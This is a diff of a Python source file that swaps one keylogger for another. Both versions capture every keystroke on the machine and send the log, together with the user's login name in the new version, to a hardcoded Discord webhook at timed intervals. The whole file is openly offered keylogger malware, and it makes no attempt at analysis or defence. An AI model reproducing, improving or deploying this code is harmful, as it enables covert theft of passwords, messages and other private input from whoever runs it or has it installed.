@@ -1,38 +1,68 @@
-import threading
-import pynput.keyboard
-import requests
+import keyboard,os
+from threading import Timer
+from datetime import datetime
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
-log = ""
-webhook_url = "https://discord.com/api/webhooks/1328769869260525568/TdEkWxoQwBXR-DkbreHln5Uhy45Wn9Ys0Ay27q5vQGtmKhrKUwqCqnYX3M7qsNl8UxUN"
+SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
+WEBHOOK = "https://discord.com/api/webhooks/1396447608129454142/TGvfz7txmH8ujO0yhIQoUf91kmasKBSqL4zImtGz9YZKUcw_ic0kVw735ki01_DLracA"
 
-def callback_function(key):
-    global log
-    try:
-        log += str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log += " "
+class Keylogger: 
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def report_to_webhook(self):
+        flag = False
+        webhook = DiscordWebhook(url=WEBHOOK)
+        if len(self.log) > 2000:
+            flag = True
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
         else:
-            log += f" {str(key)} "
+            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
+        webhook.execute()
+        if flag:
+            os.remove(path)
 
-def send_log_to_discord():
-    global log
-    global webhook_url
-    if log:
-        payload = {
-            "content": log
-        }
-        try:
-            requests.post(webhook_url, json=payload)
-        except Exception as e:
-            print("Sending error:", e)
-        log = ""
-    timer = threading.Timer(60, send_log_to_discord)
-    timer.start()
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
 
-send_log_to_discord()
-
-keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
-
-with keylogger_listener:
-    keylogger_listener.join()
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger.start()
